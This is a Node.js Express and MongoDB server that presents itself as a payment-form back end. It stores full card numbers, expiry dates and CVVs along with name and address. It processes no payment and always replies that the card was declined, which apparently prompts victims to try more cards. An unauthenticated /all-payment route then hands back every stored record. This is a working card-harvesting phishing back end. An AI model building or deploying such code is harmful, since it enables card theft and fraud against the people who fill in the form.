require('dotenv/config');
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');

// Connect to MongoDB
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log('Connected to MongoDB'))
  .catch(err => console.error('Could not connect to MongoDB', err));

// Define a schema and model for the payment data
const paymentSchema = new mongoose.Schema({
    fullName: {
      type: String,
      required: [true, 'Full name is required'],
      minlength: [3, 'Full name must be at least 3 characters'],
      maxlength: [50, 'Full name must be less than 50 characters'],
    },
    email: {
      type: String,
      required: [true, 'Email is required'],
      match: [/^[^\s@]+@[^\s@]+\.[^\s@]+$/, 'Please provide a valid email address'],
    },
    address: {
      type: String,
      required: [true, 'Address is required'],
    },
    city: {
      type: String,
      required: [true, 'City is required'],
    },
    state: {
      type: String,
      required: [true, 'State is required'],
    },
    zip: {
      type: String,
      required: [true, 'ZIP code is required'],
      match: [/^\d{5,9}$/, 'ZIP code must be between 5 and 9 digits'],
    },
    
    cardNumber: {
      type: String,
      required: [true, 'Card number is required'],
      match: [/^\d{12,19}$/, 'Card number must be between 12 and 19 digit number'],
    },
    cardName: {
      type: String,
      required: [true, 'Name on card is required'],
    },
    expiry: {
      type: String,
      required: [true, 'Expiry date is required'],
      match: [/^(0[1-9]|1[0-2])\/(\d{2})$/, 'Expiry date must be in MM/YY format'],
    },
    cvv: {
      type: String,
      required: [true, 'CVV is required'],
      match: [/^\d{3,4}$/, 'CVV must be a 3 or 4-digit number'],
    },
  });

const Payment = mongoose.model('Payment', paymentSchema);

const corsOptions = { 
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization']
  };
  
  
  const app = express();
  app.use(cors(corsOptions));
  app.use(express.json());
  app.use(express.urlencoded({ extended: true }));

// Endpoint to handle form submission
app.post('/submit-payment', async (req, res) => {
  try {
    const paymentData = new Payment(req.body);
    //check if email already exist 
    const existingPayment = await Payment.findOne({ email: req.body.email });
    if (existingPayment) {
        return res.status(400).json({ message: 'Email already exists' });
        }
    await paymentData.save();
    res.status(200).send({ message: 'Payment declined,try using another card or contact issuing bank.' });
  } catch (err) {
    if (err.name === 'ValidationError') {
        // Handle validation errors
        const errors = Object.values(err.errors).map(e => e.message);
        res.status(400).send({ message: 'Validation failed', errors });
      } else {
        res.status(500).send({ message: 'Failed to save payment information', error: err });
      }
  }
});

app.get('/all-payment',async(req,res)=>{
    try {
        const payments = await Payment.find().sort({ createdAt: -1 });
        res.status(200).send(payments);
        } catch (err) {
            res.status(500).send({ message: 'Failed to fetch payments', error: err });
            }
})

// Start the server
const PORT =process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
